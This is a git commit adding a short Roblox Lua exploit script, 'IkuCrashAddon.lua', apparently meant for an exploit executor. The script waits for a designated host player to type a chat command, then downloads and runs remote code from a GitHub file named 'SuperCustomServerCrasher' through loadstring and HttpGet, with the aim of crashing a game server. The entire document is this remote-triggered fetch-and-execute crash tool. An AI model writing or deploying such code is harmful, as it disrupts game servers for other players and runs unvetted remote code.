d9c904b4eafec4db8e0e8677605978e1b1a8a0a6
Chiiicken <65784006+Chiiicken5538@users.noreply.github.com>
2022-04-18 00:33:50 +0200

    Create IkuCrashAddon.lua

---
+++ IkuCrashAddon.lua
@@ -0,0 +1,17 @@
+repeat task.wait() until game:IsLoaded()
+
+
+local function playerfromuserid(userId)
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.UserId == userId then
+            return player
+        end
+    end
+end
+
+playerfromuserid(getgenv().Settings.host).Chatted:Connect(function(msg)
+    if msg:match(getgenv().Settings.prefix.."tooldupe") then
+        -- automatic crash start is almost done - I will update this soon
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+    end
+end)
